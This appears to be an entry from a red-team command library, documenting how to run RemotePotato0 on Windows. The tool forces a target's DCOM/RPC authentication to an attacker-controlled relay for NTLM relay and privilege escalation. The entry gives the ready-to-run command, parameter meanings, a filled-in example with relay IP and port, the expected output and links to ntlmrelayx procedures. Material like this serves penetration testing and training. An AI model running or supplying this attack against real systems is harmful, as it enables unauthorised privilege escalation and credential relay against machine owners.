---
id: ec5aaed4-7974-4138-bfd8-4ed6c7dde54d
name: remote-potato0-dcom-relay-execution
type: command
executor: cmd
data: RemotePotato0.exe -r $_RELAY_IP -p $_RELAY_PORT -s $_SESSION_ID
output: null
created_at: '2023-04-06T03:56:05.609285+00:00'
updated_at: '2023-04-10T20:26:29.616322+00:00'
platforms:
  - Windows
tags:
  - dcom
  - rpc
  - relay
verified: true
validated: true
---

# remote-potato0-dcom-relay-execution

## Command

```cmd
RemotePotato0.exe -r $_RELAY_IP -p $_RELAY_PORT -s $_SESSION_ID
```

## Description

Executes RemotePotato0 to trigger a DCOM/RPC connection from the target machine to the attacker's relay, facilitating NTLM authentication relay for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -r $_RELAY_IP | IP of the relay server (e.g., 192.168.83.131) | Yes |
| -p $_RELAY_PORT | Port on relay server (e.g., 9998) | Yes |
| -s $_SESSION_ID | Session ID to execute in (e.g., 2 for session 0 variant) | Yes |

## Examples

### Basic Usage

```cmd
RemotePotato0.exe -r 192.168.83.131 -p 9998 -s 2
```

### Advanced Usage

For different session:
```cmd
RemotePotato0.exe -r $_IP -p $_PORT -s 0
```

## Expected Output

"[*] Connecting to relay..." followed by "[+] DCOM activation successful". No output if relay fails; check ntlmrelayx logs for auth.

## Related

- [[commands/ntlmrelayx-ldap-escalate-user]]
- [[procedures/DCOM-DCE-RPC-Relay-using-RemotePotato0]]
